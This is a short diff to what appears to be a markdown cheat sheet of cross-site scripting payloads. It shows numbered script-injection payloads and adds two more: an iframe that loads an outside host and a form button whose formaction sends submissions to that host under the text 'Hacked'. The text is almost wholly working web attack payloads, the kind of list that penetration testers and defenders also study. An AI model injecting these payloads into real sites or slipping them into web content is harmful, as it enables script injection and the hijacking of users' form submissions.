@@ -93,6 +93,10 @@ Try to use this payloads :
 13) <script>prompt.call(null,1)</script>
 
 14) <script>alert.apply(null, [1])</script>
+
+15) <iframe src=//14.rs>
+
+16) <form><button formaction=http://14.rs>Hacked</form>
 ```
 
 ### 4.If space is encoded or deleted
